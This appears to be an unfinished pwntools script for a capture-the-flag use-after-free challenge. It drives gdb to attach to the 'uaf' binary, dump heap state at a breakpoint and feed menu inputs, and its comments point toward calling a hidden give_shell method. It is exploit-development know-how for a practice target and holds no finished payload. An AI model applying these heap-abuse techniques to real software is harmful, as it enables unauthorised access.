import os

from pwn import *
logger = log

# print "haha"
# print p32(0xdeadbeef)
# print cyclic(39)
# e = ELF('uaf')
# print e
# print "0x%x" % e.symbols['_ZN5Human10give_shellEv']
# introduce_addr =  0x00401192
# gdb.debug('./uaf')

# print context.terminal
# context.terminal = ['tmux', 'splitw', '-h']

# context.log_level = 'debug'
# # context.binary = './uaf'
# context.terminal = ['sh']
# # context.terminal = ['tmux', 'splitw', '-h']
#
# # Start a process
# bash = process('./uaf')
#
# # Attach the debugger
#
#     # set follow-fork-mode child
# gdb.attach(bash, '''
# ''')
#     # break * main
#     # continue
#
# # Interact with the process
# bash.sendline('1')


# context.log_level = 'debug'
# context.binary = './uaf'
# context.terminal = ['sh']
# context.terminal = ['tmux', 'splitw', '-h']

uaf = process(['./uaf'])
gdb = process(['gdb', '-q'])

# FUCK YEEAH
gdb.sendline('call close(0);')
gdb.sendline('call close(1);')
gdb.sendline('call close(2)')
gdb.sendline('call open("/dev/pts/4", 2, 0)')
gdb.sendline('call dup(0)')
gdb.sendline('call dup(0)')

gdb.sendline('attach %d' % uaf.pid)

gdb.sendline('b * main+238')
gdb.sendline('commands')
# gdb.sendline('i r rdi')
# gdb.sendline('p/20x $rdi)
gdb.sendline('heap all')
gdb.sendline('continue')
gdb.sendline('end')
gdb.sendline('run 24 ./OutFile')
# gdb.sendline('continue')
# gdb.sendline('heap all')
gdb.sendline('1')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('2')
gdb.sendline('3')

# gdb.sendline('1')

gdb.interactive('')

